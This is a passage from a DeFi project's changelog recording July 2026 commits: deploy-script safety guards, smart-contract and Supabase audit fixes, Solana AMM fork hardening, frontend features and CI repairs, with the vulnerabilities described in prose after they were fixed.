+- `2405a79a` — not a defect but a cost tune landed in the same driver: the `--with-gas-price` default dropped from 0.5 gwei to 0.2 gwei, moved into an env-overridable `GAS_PRICE_WEI`, and threaded through the post-broadcast TegridyLending command in the printed instructions. The commit records 0.2 gwei as roughly 2.5× the then-current base fee and the change as cutting deploy cost by about 60%.
+
+### Added — a one-command driver for the gated-feature deploy, with everything but the signature pre-filled (2026-07-15)
+
+`d9ffba9a` — `contracts/script/deploy-gated.sh` runs the 8 non-oracle-gated contracts in the recommended order, **dry-run by default**. Every environment value is resolved inside the file rather than left to the operator: canonical addresses, `MULTISIG` = the current governance Safe `0xA360…` (verified on-chain to have code), `TREASURY` = the fee Safe, and the last-known-live policy numbers — `EMISSION_BUDGET` 1M per epoch, `BRIBE_FEE_BPS` 3%, `PROTOCOL_FEE_BPS` 5%, the NFT-pool fee 0.5%, and `MONTHLY_FEE` 10,000 TOWELI read off the old `PremiumAccess` on-chain. **The only input is the operator's own signer** (`SIGNER="--account deployer"` or `"--ledger"`) plus an Etherscan key; no raw key is ever in the file, and it errors cleanly without a signer.
+
+`5ae58dec` landed `docs/GATED_DEPLOY_RUNBOOK.md` as the long form — the canonical env block with its stale-treasury warning and REVIEW-flagged policy defaults, per-contract dry-run and Flashbots-broadcast commands, `acceptOwnership`, Etherscan and Sourcify verification, `constants.ts` wiring per contract, the LaunchpadV2 `dropTemplate` verification plus the Pro-Pass-via-launchpad step, and the TegridyLending oracle gate. `d9ffba9a` then filled in the resolved `MULTISIG` and `MONTHLY_FEE` and added the one-command fast path. It pairs with the nine hardened deploy scripts from `a01527c0`.
+
+Two honesty notes the commits carry themselves. The driver was **not executed here** — the local `forge build` hang means it only runs on the operator's machine, and `bash -n` is the whole of the verification that was done. And a warning is baked into both the script and the runbook: `MULTISIG` points at the **current** governance Safe, whose signer set the red team flagged as compromised-quorum. Rebuilding it first and swapping one line, or deploying now and re-transferring after the rebuild, was left as the operator's decision — that and supplying the key were recorded as the only things still outstanding.
+
+### Security — nine gated-feature deploy scripts could be pointed at the wrong network, a non-Safe owner, or an L2 grace buffer (2026-07-15)
+
+`a01527c0` — a pre-deploy verification pass over the nine gated deploy scripts found constructor args, canonical addresses (no stale drift) and ownership/sister wiring all correct. **The one systemic gap was guards**: `DeployNFTLending` and `DeployTegridyLending` were NEEDS-FIX for a missing fleet-standard `MAINNET_ONLY` guard, and the rest carried guards inconsistently. Three guards were added across the fleet:
+
+- `require(block.chainid == 1)` — refuse a wrong-network broadcast outright, matching what `DeployMVP` / TWAP / LaunchpadV2 already carried.
+- `require(multisig.code.length > 0)` — a typo'd or EOA `MULTISIG` cannot be handed ownership. **Critical for `DeployNFTPoolFactory`, which sets the owner directly in its constructor and so has no 2-step recovery** if the address is wrong.
+- On the four sequencer-feed scripts (MemeBounty, NFTLending, TegridyLending, LaunchpadV2), `require(SEQUENCER_FEED == address(0))` on mainnet. The feed is baked **immutable** into the contract — and, for the launchpad, into every `TegridyDropV2` clone — so a stray environment value would thread an L2 grace buffer permanently into mainnet state. `DeployLaunchpadV2`'s existing line-23 mainnet guard had already rendered its old "L2 needs a `SEQUENCER_FEED`" branch dead code, so that branch was replaced rather than left standing.
+
+The scripts were otherwise deploy-ready; policy defaults and canonical env addresses were pushed to the runbook instead of the scripts. `TegridyLending` stays oracle-gated (deploys post-TWAP-bootstrap), and the Pro Pass is a LaunchpadV2 operation rather than a contract to deploy.
+
+### Fixed — CommunityGrants could approve a grant it was structurally unable to pay (2026-07-14)
+
+`4ec2e1d0` — the 2026-07-14 pre-deploy batch audit of the nine gated contracts returned **8 GO, 1 GO-WITH-FIXES, 0 NO-GO**, zero Critical/High/Medium confirmed, and all prior fixes verified holding. The one code change was a liveness footgun, and it is a cap-alignment bug rather than a hole:
+
+The grant-creation cap `MAX_GRANT_PERCENT_BPS` (50%) exceeded the per-window `MAX_ROLLING_DISBURSEMENT_BPS` (30%), but **a grant is paid in one atomic transfer that has to clear both caps at execute**. A single grant sized in the (30%, 50%] band was therefore approvable and finalizable, then reverted `RollingDisbursementExceeded` on every execution attempt — approved-but-never-payable, with its ETH locked in `totalApprovedPending` until the grant lapsed. Creation now caps at `min(grant, rolling)` = 30% in both the check and the stored `absoluteCap`, so an un-payable grant is rejected up front. **No funds were ever at risk** — the state self-heals through cancel or lapse.
+
+Two items the report deferred to their deploy windows, recorded here so they are not lost: the `TegridyLending` sweep reverse index (oracle-gated; it landed on 2026-07-16, above), and a `TegridyNFTLending` `pauseHistory` prune — a Medium compromised-owner DoS the report marks **mandatory before any L2 deploy** and optional on mainnet. `TegridyNFTLending`'s offer-cap griefing stays a documented tradeoff.
+
+### Fixed — the launchpad's fee recipient was the pre-relaunch treasury, and the correction existed only as an uncommitted edit (2026-07-14)
+
+`3698a03b` — `DeployLaunchpadV2`'s `TREASURY` constant still named the stale pre-relaunch treasury `0xE9B7…f53e`. The re-point to the live relaunch 2-of-2 Safe `0x7D26…Bd7d` was sitting in the working tree as an **uncommitted edit**, which is the worst place for it to be: the 2026-07-12 pre-deploy audit (GO verdict, 0 code findings) had named this the single deploy blocker, because **the address is baked into every `TegridyDropV2` clone as the fee recipient and is only forward-changeable**. Committing it is what makes the Etherscan/Sourcify-verified source match the bytecode about to be deployed. `0x7D26…Bd7d` was checked against `TREASURY_ADDRESS` in `frontend/src/lib/constants.ts` and against the relaunch runbooks.
+
+The commit deliberately stops at the deploy script. `CONTRACTS.md`, `TOKENOMICS.md`, `TOKEN_DEPLOY.md` and `RELAUNCH_RUNBOOK.md` still cite `0xE9B7` in places — but **`0xE9B7` is also a multisig signer address**, so a blind find-and-replace would corrupt the signer references. Those were left for per-occurrence review.
+
+### Security — a SIWE JWT could forge chat reactions as any wallet, and `/api/solrpc` was an open proxy onto a paid RPC (2026-07-12)
+
+First adversarial audit of the Supabase + serverless layer (RLS auth-bypass, SIWE/JWT, proxy SSRF/authz, integrity, secrets). `3e680798` records two confirmed findings, both dual-verified, and no funds, PII or key exposure — the commit states the DB otherwise binds identity to the JWT correctly.
+
+- **M-1, authorization bypass.** `toggle_reaction` was `SECURITY DEFINER` but derived the acting wallet from its own `wallet` **argument**, never from the JWT. Migration `010` had revoked `anon` and banked on "the proxy is the only caller" — but **a SIWE JWT is a first-class `authenticated` PostgREST token**, so any logged-in user could `POST /rest/v1/rpc/toggle_reaction` directly, bypassing the proxy's server-side wallet injection, and add or remove chat reactions attributed to any wallet. New migration [`011_reaction_jwt_binding.sql`](frontend/supabase/migrations/011_reaction_jwt_binding.sql) rewrites the body to bind identity to `request.jwt.claims` and reject a mismatched argument, mirroring the sibling `toggle_like`. An RPC sweep confirmed `toggle_reaction` was the **only** SECURITY-DEFINER-with-wallet-arg function missing the bind. Blast radius was cosmetic reactions. The migration is an operator action — it has to be applied by hand in the Supabase SQL Editor.
+- **L-1, cost/DoS.** [`frontend/api/solrpc.js`](frontend/api/solrpc.js) forwarded raw JSON-RPC verbatim to the keyed, paid Solana RPC behind nothing but an Origin check — trivially spoofed by a non-browser client — making it an open proxy for expensive scans such as `getProgramAccounts`, which burn compute units. Fixed with a method allowlist mirroring `alchemy.js` (reads plus transaction send/confirm only) and a batch cap; four regression tests added, suite 8/8. No key leak either way — the upstream URL stays server-side.
+
+### Security — six findings on gated contracts, then a due-diligence pass that found three defects in the fixes' own tests (2026-07-12)
+
+Four commits, one story. Local `forge build` hangs on the dev box, so CI is the compile gate throughout — which is why the test defects below were only visible after a push.
+
+**`3f87bd89` closed all 6 findings of the 2026-07-12 full audit.** All six sit on gated/undeployed contracts; the live MVP was clean. Storage insertions are on not-yet-deployed contracts, so layout-safe, and each was dual side-effect-reviewed with a fail-on-old/pass-on-new regression test.
+
+- **HIGH, `TegridyV4Hook`** — a dedicated `polAccrued[id]` accumulator, credited only in `_afterSwap`, so `sweepPOL`/`distributeFees` redeem the POL pot and never `LiquidityPenaltyHook`'s withheld JIT-fee claims, which share the same ERC-6909 slot. Pre-fix that was LP-fee theft plus a bricked `removeLiquidity`. CEI-zeroed before transfer.
+- **MED, `TegridyNFTPool`** — `minOutput` enforced against net (`outputAmount - royalty`) rather than gross, following Sudoswap's LSSVMPair; no underflow, since royalty is capped at 25%.
+- **MED, `CommunityGrants`** — `lapseStaleProposal` broadened to lapse any permanently-unapprovable proposal, not just the fewer-than-3-voters case.
+- **MED, `SequencerCheck`** (the shared library) — the heartbeat/staleness reject dropped on the **event-driven** L2 uptime feed at all four sites, per the Aave/Chainlink pattern; mainnet is unaffected because that feed address is zero.
+- **MED, `TegridyNFTPoolFactory`** — a per-creator-per-collection cap of 20, so one actor cannot fill a collection's 200-slot namespace.
+- **LOW, `TegridyLending`** — `MAX_TOTAL_OFFERS` gated on a live `activeOfferCount` instead of the append-only `offers.length`, the same defect fixed on `TegridyNFTLending` three days earlier.
+
+**`0b34a37d`, a 21-agent adversarial re-verify, found all 6 production fixes hold — and that the tests around them did not.**
+
+- The SequencerUptimeStaleness test's five positive-path functions were declared `public view` but call the state-mutating mock's `feed.set()`, so **the whole forge build failed to compile and the entire suite was skipped** — CI was red for a reason unrelated to the fix. Dropping `view` fixed it. Separately, `getResumeTimestamp` hardcodes a 24h staleness with no parameter, so the 8h `updatedAt` case passed on old *and* new code; bumped to 25h so it genuinely fails on old.
+- The StaleLapse test warped ~32d, but `lapseStaleProposal` needs >37d (a 7d deadline plus a 30d `EXECUTION_DEADLINE`), so the headline test reverted `ExecutionDeadlineNotExpired` on old and new alike. Warp is now +38d, matching its siblings.
+- **The broadened CommunityGrants guard was itself over-broad.** It included `votesFor <= votesAgainst`, which made a quorum-met but voted-**down** proposal permissionlessly lapse-able after the grace window — forfeiting the proposer's 50% refund that `finalizeProposal`'s Rejected branch (`:550-566`) would pay. Narrowed to the four finalize-*revert* conditions only (`canNeverFinalize`); voted-down proposals self-resolve through finalize. A regression test locks the no-grief behaviour.
+- And the `TegridyNFTPoolFactory` residual was written down honestly rather than claimed closed: the per-creator cap is Sybil mitigation, raising the bar from one actor to roughly 10 EOAs, not a full close.
+
+**`4779c7f1` then closed it durably — and in doing so corrected the 2026-05-05 LOOP-01 fix recorded further down this file.** The hard `MAX_POOLS_PER_COLLECTION = 200` *creation* cap doubled as a permanent single-actor censorship vector: because `_poolsByCollection` is append-only, filling the 200 slots (the deposit is recoverable, so the real cost is gas) bricked `createPool` for that collection **forever**, and it stayed bricked even after the attacker withdrew the seed — a non-refundable deposit would only raise the cost, not un-censor. The fix decouples creation from the cap. Creation is now bounded only per-creator (the unchanged 20-cap), and the constant is repurposed as the legacy finders' scan bound, so `getBestBuyPool`/`getBestSellPool` keep the exact LOOP-01 gas envelope without gating creation — safe because no on-chain contract consumes those finders, only the frontend, which has paginated variants. Regression test: 201 pools across creators now succeed, and reverted before the close.
+
+The same commit added the M19-PORT `acceptOwnership()` pending-proposal flush to `GaugeController`, `TegridyFeeExecutorRouter` and `TegridyV4HookAdmin`, an invariant 11+ sister admin contracts already honoured. Without it, a proposal queued by an outgoing or compromised owner survived the handoff in `_executeAfter[]` — bounded only by the 7-day `PROPOSAL_VALIDITY` — and could mature under the new owner. Each override replicates that contract's own `cancelX` bodies verbatim under an `_executeAfter` guard. Not attacker-executable pre-fix, since every execute is `onlyOwner`; defence in depth.
+
+**`de51f1a5` closed the loop.** CI confirmed the audit fixes, the durable close and the M19-PORT flushes all compile and break zero tests — with exactly one pre-existing failure, `test_DEEP_LIB_M3_TighterStaleness_Trips_Earlier` in [`contracts/test/Deep_LibBase_2026_05_01.t.sol`](contracts/test/Deep_LibBase_2026_05_01.t.sol). **That test asserted the bug.** It required a tighter staleness window to trip `SequencerDown` on the L2 uptime feed, which is precisely the behaviour finding #5 deliberately removed: that feed's `updatedAt` is legitimately old during healthy uptime, and canonical Aave V3 `PriceOracleSentinel` does not staleness-check it. Rewritten and renamed to `test_DEEP_LIB_M3_StalenessDoesNotTripOnHealthyUptimeFeed`, now asserting that neither the default 24h nor a tighter 4h window reverts on a healthy-but-old feed. Shards match by file path (`--match-path`), so the rename does not move the test out of its shard; no sibling test asserts the removed behaviour.
+
+### Added — a responsible-disclosure channel, private send-paths for admin broadcasts, and an opt-in SMTChecker profile (2026-07-12)
+
+`aee9f966` wires the self-contained half of that day's tooling survey; [`docs/SECURITY_TOOLING.md`](docs/SECURITY_TOOLING.md) (182 lines) carries the full researched catalogue plus the account/key/hardware checklist only the operator can act on (Rabby, Supabase Advisor, OZ Monitor, Sourcify, Ledger, Aderyn CI, MCP servers, bug bounty, indexer, analytics), each with exact commands.
+
+- [`frontend/public/.well-known/security.txt`](frontend/public/.well-known/security.txt) (RFC 9116) — verified copied into `dist/.well-known/` and served *before* the SPA rewrite. **Closes the gap where a whitehat had no way to reach a solo dev.** The address is to be swapped for a `security@` alias when one exists.
+- `@custom:security-contact` NatSpec on `Toweli` and `SwapFeeRouter`, which renders on Etherscan's verified source. Both contract edits are comment-only.
+- Flashbots Protect and MEV-Blocker `[rpc_endpoints]` in [`contracts/foundry.toml`](contracts/foundry.toml), so admin and deployer broadcasts — `acceptOwnership` ×8, the deepen-LP add, `BootstrapTWAP` — cannot be sandwiched. Send-only; reads stay on mainnet.
+- An opt-in `[profile.smtcheck]` SMTChecker formal-verification profile — free, scoped to `Toweli`, CI-only, with the default build and CI unaffected. Both profiles were validated to parse via `forge config`.
+- [`.vscode/extensions.json`](.vscode/extensions.json) recommending Wake, Nomic Solidity, Solidity Visual Auditor, Metrics and Even Better TOML — in-editor detectors adopted explicitly as mitigation for the local forge-build hang.
+
+`897a5045` then put the endpoints to use: the go-live sequence in [`docs/GOLIVE_CORELOOP.md`](docs/GOLIVE_CORELOOP.md) now passes `--rpc-url flashbots` directly, and **BootstrapTWAP's broadcast (step B3, which touches the pool and the oracle) was moved off the public `$RPC` it had been using, where it could be front-run.** Dry-runs and reads stay public.
+
+### Added — four retention surfaces, gated on live reads: the activity feed renders nothing at all while the pool is dormant (2026-07-11 → 2026-07-12)
+
+Four numbered items off an internal deep-research feature list — the `(#4)`/`(#7)`/`(#8)` suffixes in the commit subjects read as positions on that list, not PRs. Each is a new component wired into one page; `df91efab` is the one that states outright that it is purely additive and cannot break the money path.
+
+- **Live Protocol Pulse** (`03429f6d`, [`ProtocolPulse.tsx`](frontend/src/components/ProtocolPulse.tsx), 107 lines, plus an 89-line `useProtocolActivity` hook) — real recent TOWELI buys and sells, and deliberately *not* from `eth_getLogs`: **that method is rejected across the entire free keyless RPC roster** (publicnode `-32602` archive, drpc `err30`, merkle CORS) and the Ponder indexer is not deployed, so the feed reads GeckoTerminal's public trades API instead (keyless, CORS-OK). It follows the RealYieldProof pattern and renders **nothing** while the pool is dormant — verified live at 0 trades in 24h, the protocol's true incentive-off baseline — and lights up on its own the moment real trading exists. The Gecko field mapping was validated against an active pool with 300 trades; clean-mount verified in Chrome with no errors and correctly invisible.
+- **"Prove It"** (`805737ef`, [`ProofOfClaims.tsx`](frontend/src/components/ProofOfClaims.tsx), 108 lines) — every headline claim read straight from the contracts (`totalSupply`, `balanceOf(dead)` for burn share, `SwapFeeRouter.feeBps`), each row tappable through to Etherscan. The point is structural rather than cosmetic: the 2026-06-12 audit found a fabricated supply figure and a 0.30-versus-0.5% fee mismatch in trust copy, and **a rendered on-chain read cannot drift**. Unlike the activity feed these are cheap `eth_call` reads that work fine on the free roster, so the panel is always populated, and a row self-gates on a failed read rather than showing a false green check. Verified live: 1,000,000,000 TOWELI, 25.8% burned, 0.50% fee.
+- **Position Health Center** (`9d527f87`, [`PositionHealth.tsx`](frontend/src/components/PositionHealth.tsx), 158 lines) — reads the live staking position through `useUserPosition` and warns *before* value is lost: lock expiring inside 7 days (keep your Nx boost), lock ended (boost at risk, re-lock), unclaimed rewards (claim and compound), each with a one-tap CTA. Shows a calm "all good" summary when nothing needs attention, and self-gates to null with no staking position. Placed atop the Dashboard; verified on a connected wallet surfacing "39.2K TOWELI ready to claim". Lending rows are deferred until the lending contracts deploy.
+- **One-click approve+stake via EIP-5792** (`df91efab`) — `buildApproveStakeCalls` in [`stakeBatch.ts`](frontend/src/lib/stakeBatch.ts) is pure and unit-tested (2/2, on targets, selectors and encoding) and encodes the approve+stake batch; [`useOneClickStake`](frontend/src/hooks/useOneClickStake.ts) detects atomic-batch capability with `wallet_getCapabilities` and submits through `wallet_sendCalls` in a single confirmation. `canBatch` gates the affordance, so the proven sequential approve→stake stays the path on every non-supporting wallet. **Deliberately not wired into `StakingCard`:** the atomic-execution path needs a real smart-account or EIP-7702 wallet to actually sign the batch, which cannot be exercised headless — the same gate the codebase already states for this integration.
+
+### Internal — CI and build maintenance: a TypeScript build that had never run, a gitleaks false positive, and a diff-guard that flagged everything (2026-07-10 → 2026-07-12)
+
+No user-visible effect.
+
+- `40f23a50` — **pushing the accumulated `mvp-launch` branch ran the frontend `tsc -b && vite build` for the first time**, and surfaced two pre-existing type errors from the motion-system and "Prove It" commits that had never been CI'd because the branch had never been pushed. In `ProofOfClaims.tsx`, the `useReadContracts` conditional spread `...(feeDeployed ? [{feeBps} as const] : [])` collapsed wagmi's per-entry tuple inference, so TS checked the TOWELI entries against the SWAP_FEE_ROUTER entry's type; replaced with a static heterogeneous array mirroring `useProtocolStats` / `useRevenueStats` — `feeBps` is always read, and `allowFailure` plus the existing `feeDeployed` result-guard already discard it when the router is not deployed. In `CountUpText.tsx`, a strict-null-check gap: the regex capture `numStr` is typed `string | undefined`, so an explicit early return was added. Verified locally — `tsc -b` clean and `vite build` succeeding at 6,548 modules transformed. Contract work was unaffected; this only unbroke CI's Build job.
+- `aed5411f` — gitleaks' `generic-api-key` high-entropy heuristic flagged the **public** TOWELI contract address on line 10 of `security.txt` as a secret (entropy 4.1). It is a public on-chain address, already throughout the repo and on Etherscan. Added [`.gitleaks.toml`](.gitleaks.toml) with `useDefault = true`, so the full default ruleset stays active and the gate is unchanged, plus a narrow allowlist for that one known-public constant. The reasoning is recorded in the commit: a 42-character address cannot mask a 66-character private key, so no real-secret detection is weakened. (This per-address style of allowlist was later replaced by a shape-based rule on 2026-07-29.)
+- `23e0ca92` — the Solana diff-guard's allow-list regex was anchored to end-of-line, but `diff -rq` output ends in the word `differ`, not the filename, so nothing matched and **every diff was flagged** — a false failure. The corrected filter was verified locally to pass on exactly the two authority files. The commit's own note is the one worth keeping: the guard itself worked, it caught its author's regex bug.
+- `0b7474d0` — Solana CI now publishes the compiled `.so` as a build artifact, which is what makes a devnet deploy possible at all from a machine that cannot compile one.
+- `23d659ac` — a turnkey devnet deploy script that downloads that CI artifact, airdrops, deploys and shows the program. **Blocked only on the rate-limited devnet faucet** — the 692KB program needs roughly 5 SOL — with everything else proven working.
+
+### Fixed — a route transition that never transitioned, a supply donut that rendered blank in production, and stat pills that read as empty purple boxes (2026-07-11)
+
+All four verified on localhost through Chrome; three of them record `tsc --noEmit` clean, and the two motion commits record zero runtime console errors.
+
+- `4584b08b` — **the route component was named `AnimatedRoutes` and animated nothing**; pages hard-popped in. Added [`frontend/src/lib/motion.ts`](frontend/src/lib/motion.ts) — shared easing, duration and spring tokens plus page/reveal/stagger entrance variants, so 60+ framer-motion usages stop hand-rolling their own timing — and a `components/motion/` directory with `PageTransition` (keyed on pathname), `Reveal` (scroll-into-view) and `AnimatedNumber`, all honouring the app-wide `reducedMotion=user` and `LazyMotion(domAnimation)` strict setup. `AppLayout` wraps the `Outlet`, so every route now settles in with a fade, a subtle rise and a micro-scale, layering over the existing RouteGlitch overlay. Note the name is a second attempt: an earlier `frontend/src/components/PageTransition.tsx` was deleted as unimported in the oldest sweep this file records — this one is actually wired into the layout.
+- `0df697f7` — second motion increment, and a same-day correction of the one above: **`AnimatedNumber`, added the previous commit, was deleted as redundant** with the existing `AnimatedCounter`. In its place `CountUpText` rolls the numeric part of an already-formatted stat string up from 0 and springs on change while preserving prefix, suffix, decimals and grouping exactly, and renders non-numeric values (an em-dash, say) unchanged — which is what lets a roll-up be added at a string-formatted stat site with a one-line wrap instead of a hook or formatting refactor. `FarmStatsRow` staggers its tiles in via an **outer** motion wrapper, specifically so the entrance transform never overrides the tiles' CSS card-hover lift. Measured on the Farm page: TVL $16.27 → $16.41 and APR 3524.02% → 3555.21% roll up with grouping and decimals intact.
+- `4a3a9ed9` — the Tokenomics Supply Distribution pie was **blank on production and a slivered stub in dev**: a Recharts `ResponsiveContainer` that collapsed to 0 width on the keyed route remount. The earlier F50 fix had pinned the height, but `width='100%'` still measured 0. Replaced with a pure CSS conic-gradient donut — zero measurement dependency, identical in dev and prod — which also drops recharts and an unused ErrorBoundary import from that view. The legend already carried the exact percentages, so nothing was lost.
+- `e0703937` — `LivePoolCard` is an art-background card but used solid purple-75 stat pills with green text, low enough contrast that **the values read as empty purple boxes**. Switched its three pills to the dark translucent panel pattern its sibling art-bg card `FarmStatsRow` already uses, and rolled the values through `CountUpText` for consistency. The roughly 40 solid-purple-75 pills elsewhere were left alone on purpose — that is the established pattern for non-art cards, and only the art-bg green-on-purple case was wrong.
+
+### Added — a go-live path for the core loop, written from on-chain reads rather than memory (2026-07-11)
+
+Seven commits that turned "go live" from an intention into a dry-run-verified sequence, and corrected several beliefs along the way.
+
+- `856b5d59` — the econ-batch-3 audit (LPFarming / Gauge / VoteIncentives / NativeBuy / FeeExecutor / V4) returned 0 Critical, High or Medium and a single Low, fixed here. `TegridyV4SwapRouter.swap()` guarded only the refund (`bal > preBal`), not consumption, while `CurrencySettler.settle` sources native input from **the router's own balance, ignoring the payer** — so a native swap could be funded out of pre-existing or stuck ETH. Added a `bal >= preBal` conservation guard (`NativeInputUnderfunded`). The same commit added [`SeedLP.s.sol`](contracts/script/SeedLP.s.sol) (first-add TOWELI/WETH seed via canonical `addLiquidityETH`, with a donation-defence skim and a post-seed price-conservation assert) and [`BootstrapTWAP.s.sol`](contracts/script/BootstrapTWAP.s.sol) (one observation per run plus a warmth probe over `getObservationCount` + `consult`, for the 4×15min bootstrap H-18 requires before `POL.accumulate`).
+- `d7e28fb9` — dry-running BootstrapTWAP against live mainnet state surfaced two real bugs the code review had not. `TWAP.update()` charges a keeper fee (the effective `updateFee`, else `MIN_UPDATE_FEE = 1e14`) and the script sent `msg.value = 0`, so it reverted `InsufficientFee()`; it now reads the effective fee and sends it, with the excess refunded on-chain. And `update()` rejects pools below `effectiveMinReserveFloor` (default 10 WETH per side, anti-manipulation) — the live pool holds **0.0203 WETH** — so a pre-broadcast check now fails with an actionable message and logs reserve-versus-floor per side. **The live state read the same day also corrects an older belief: the native TOWELI/WETH pool is not empty.** It is seeded at market price, about 38.26M TOWELI per ETH, 0.28% off Uniswap — shallow, not absent.
+- `0e9a7f69` — the runbook writes that correction down and draws the line around it. The swap/stake/farm loop is live; what is actually gated is the oracle track (NFT lending, POL), because the TWAP's 10-WETH reserve floor needs roughly **382M TOWELI, 38% of supply**, which the protocol does not hold (treasury 0, deployer 680K) and cannot buy. [`docs/GOLIVE_CORELOOP.md`](docs/GOLIVE_CORELOOP.md) splits this into Track A — prod deploy, ownership handoff, VerifyMVP — which ships with no capital, and Track B, a strategy call.
+- `21dcdbe7` — reading the handoff state on-chain the same day found all **8 owned contracts still `owner = deployer EOA`**, and the earlier transfer to the treasury Safe **expired on 2026-06-21**, so `acceptOwnership` reverts. The handoff has to be re-initiated from scratch: rebuild the Safes, deployer `transferOwnership` ×8 (`0xf2fde38b`), multisig `acceptOwnership` ×8 (`0x79ba5097`) inside 14 days. Tx data recorded in [`docs/GOLIVE_HANDOFF.md`](docs/GOLIVE_HANDOFF.md).
+- `eb2b4afc` — `SeedLP` is first-add only and aborts on a seeded pool, so [`DeepenLP.s.sol`](contracts/script/DeepenLP.s.sol) adds proportionally at the current ratio through canonical `addLiquidityETH` to lift the WETH side over the floor, guarding balances and under-funded ETH (which would otherwise cap TOWELI) and post-asserting that LP was minted and the price unchanged. Dry-run-verified against live mainnet with a 100K-TOWELI test: 0.00262 ETH computed proportional, liquidity added, price preserved, ~302k gas.
+- `9a31fcac` — Track B decided. The owner holds ~50M TOWELI off-treasury, enough to deepen the native pool to about 1.33 WETH, with the WETH-side reserve floor lowered to exactly 1.0 WETH under the 24h timelock. A 4-agent adversarial review reading real code returned go-with-conditions, and the reasoning is worth keeping: **a thin pool is not exploitable for over-valuation here** — `consult()` reads stored observations at least 15 minutes old, a 50bps spot-versus-TWAP gate applies, the floor re-check fails closed, and a multi-block grind is defeated by the deep UNCX-locked Uniswap arb pool. Conditions attached: floor exactly 1.0 WETH, NFT-lending LTV at or below 50%, arb-linkage monitor with auto-pause. The turnkey B0–B4 sequence (DeepenLP, the floor-lower `cast`, BootstrapTWAP) is dry-run-verified end to end.
+- `f74bf0ac` — the README was still frozen in the April-2026 pre-relaunch state, with stale addresses and inflated trust claims. Rewritten against [`frontend/src/lib/constants.ts`](frontend/src/lib/constants.ts) byte-for-byte: real relaunch addresses replacing Wave-0 historical, a live-versus-gated column on every surface, correct fees (0.3% pair, 0.5% front door), Season 3, the 6-month lock tier, and a new Solana section covering Jupiter fee capture and the CP-AMM Phase-0 devnet fork. The honesty edits matter more than the additions: the audit posture now reads ongoing internal adversarial waves plus Spartan external and **no professional-firm audit yet**, unverifiable test counts are gone, and the "bug bounty — we pay" line the June audit flagged as trust-copy drift was removed. Flywheel mermaid diagrams and the personality were kept; all links verified live.
+
+### Security — the Solana fork still carried a Raydium authority, a default build would have used devnet keys, and pool creation would have reverted on every call (2026-07-10 → 2026-07-11)
+
+- `f0c866e4` — a pre-audit completeness pass found the Token-2022 support-mint allowlist alt authority (`create_support_mint_associated_owner::ID`) was **still a Raydium-controlled key**. Repointed at the Tegridy admin, so no external party retains any authority over the program. This was recorded as the fourth and final hardcoded-authority change — three in `lib.rs`, one in `create_support_mint_associated.rs` — which also means the fork's advertised "three constants" diff had been understated by one until this commit. The diff-guard allow-list was widened to exactly those two authority files and still fails on any other divergence from audited upstream; `TEGRIDY_FORK.md`'s audit scope was resynced.
+- `7ea48bf2` — a 5-angle, 17-agent adversarial pre-audit review found 9 confirmed issues in the fork's delta and setup, all fixed here.
+  - **Critical bug:** `create_pool_fee_reveiver::ID` was set to the admin **wallet**, but the code consumes it as a WSOL `TokenAccount` (`InterfaceAccount<TokenAccount>` plus `sync_native`) — **every pool creation would have reverted**. It now points at the treasury's WSOL ATA, which `deploy-devnet.sh` creates.
+  - **Hardening:** the non-devnet AUTHORITY constants became System-Program sentinels rather than the devnet keys, so **an accidental default build is non-functional instead of silently devnet-key-controlled**. CI and devnet build with `--features devnet`, and the CI artifact is devnet-only; a mainnet build is an operator verifiable build.
+  - **Identity:** `security.txt` no longer advertises Raydium's name, URL and Immunefi bounty, and the false "MadShield-audited" auditors line was removed — this fork is not audited.
+  - **Config:** `Anchor.toml`'s program id corrected to the fork's own.
+  - **Docs, one of them consequential:** the recorded fee bound was wrong in a direction that would have **set fees roughly 1000× too low** — the real bound is protocol+fund ≤ `1_000_000`, not ≤ `trade_fee_rate`. Also corrected: `create_config` sets `protocol_owner` to the admin caller rather than taking a treasury parameter (repoint with `update_config` 3/4), and `admin::ID` is a fee-withdrawal authority too.
+  
+  The diff-guard invariant held throughout — only `lib.rs` and `create_support_mint_associated.rs` differ from upstream.
+- Two send-ready operator documents landed alongside. `cdcaabad` is an audit RFQ one-pager for a Solana firm (OtterSec / Neodyme / Sec3 / Zellic) that **frames the engagement as a fork/diff review of four authority constants across two files rather than a from-scratch AMM audit**, with self-verification steps and what to confirm. `390c34fe` is a command-level mainnet runbook: mainnet keypair, set the four authority constants, verifiable build, deploy and hand upgrade authority to the multisig, `create_config(protocol_owner = treasury)`, seed pool, collect fees, Jupiter integration — with every signing step operator- or multisig-owned and positions withdrawable.
+
+### Added — Solana Phase 0: Tegridy CP-AMM, a verbatim fork of raydium-cp-swap (devnet, not audited) (2026-07-10)
+
+`183bfd70` — 69 files, 17,068 insertions under `solana/tegridy-amm/`. The operator chose "own the venue" over "be an LP" on 2026-07-10, so the protocol earns a protocol fee on every swap across pools it hosts.
+
+- **Fork base:** `raydium-io/raydium-cp-swap` (CPMM, Apache-2.0, audited, billions in TVL).
+- **Strategy: verbatim fork, smallest possible diff.** At this commit the entire code delta from upstream was three authority/identity constants in `programs/cp-swap/src/lib.rs` — program ID, `admin::ID`, `create_pool_fee_reveiver::ID` — with all swap, curve and fee math byte-identical to upstream, so the re-audit scope is "verify only those changed". (A fourth authority was found in a second file and fixed the same day; see the entry above.)
+- The fee recipient is config-driven through `amm_config.protocol_owner`, set at `create_config`, so Tegridy earns with **no code change to the fee logic**.
+- Constants at this point are devnet throwaway keypairs under a gitignored `keys/`. The mainnet program keypair, Squads-multisig admin and treasury are operator-set later.
+- `TEGRIDY_FORK.md` carries the exact diff, the earning model, the operator mainnet checklist, the threat model and the audit scope.
+
+`d9904cfa` made CI the compile source of truth, mirroring the EVM contracts pattern — **local `cargo build-sbf` is blocked on the Windows dev box**, because the platform-tools install needs symlink privilege (os error 1314) — and added the diff-guard, which clones upstream pinned at `78f254e` and fails if anything beyond `lib.rs` differs, enforcing the audit invariant on every push. (The allow-list was widened to the second authority file later the same day.)
+
+**Stated plainly in the commit itself: Phase 0 is devnet groundwork only. Not audited, not on mainnet, holds no real funds.** Mainnet is gated behind a professional diff-audit.
+
+### Fixed — every multi-segment aggregator path 404'd in production, including the Jupiter quote, and the first two passes each left it broken (2026-07-10)
+
+Three commits in one day. The first pass fixed a real shadowing bug and the endpoint still 404'd; the second fixed the routing and had its routing fix replaced hours later — kept here in sequence because the false starts are the useful part.
+
